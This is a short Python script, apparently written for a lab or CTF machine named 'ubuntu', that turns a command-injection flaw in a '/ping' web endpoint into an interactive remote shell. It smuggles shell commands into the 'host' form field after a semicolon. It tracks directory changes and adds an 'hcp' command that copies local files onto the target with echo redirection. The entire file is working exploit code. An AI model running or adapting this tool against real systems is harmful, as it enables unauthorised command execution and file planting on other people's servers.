import requests

url = 'http://ubuntu:4400/ping'
path = '/'

def execute_remotely(command):
    prepered_command = ';cd %s; %s' % (path, command)
    d = {'host': prepered_command}
    res = requests.post(url, data=d)
    return res.json()['output'][:-1]


def cd(command):
    d = {'host': ';'+command+'; pwd'}
    res = requests.post(url, data=d)
    return res.json()['output'].replace('\n', '')

def copy_from_host(source, destination):
    output_command = 'echo \"'
    with open(source, 'r') as source_file:
        for l in source_file.readlines():
            output_command+=l
        
    output_command = output_command.replace('\n', '')
    output_command+='\" > '+destination
    execute_remotely(output_command)

path = cd('cd ./')


while 1:
    print('RCE@ubuntu '+path+' > ', end='')
    command = input()
    if command == 'exit':
        break
    if command[0:2] == 'cd':
        path = cd(command)
    if command[0:3] == 'hcp':
        source_file = command.split(' ')[1]
        destination_file = command.split(' ')[2]
        copy_from_host(source_file, destination_file)
    else:
        output = execute_remotely(command)
        print(output)

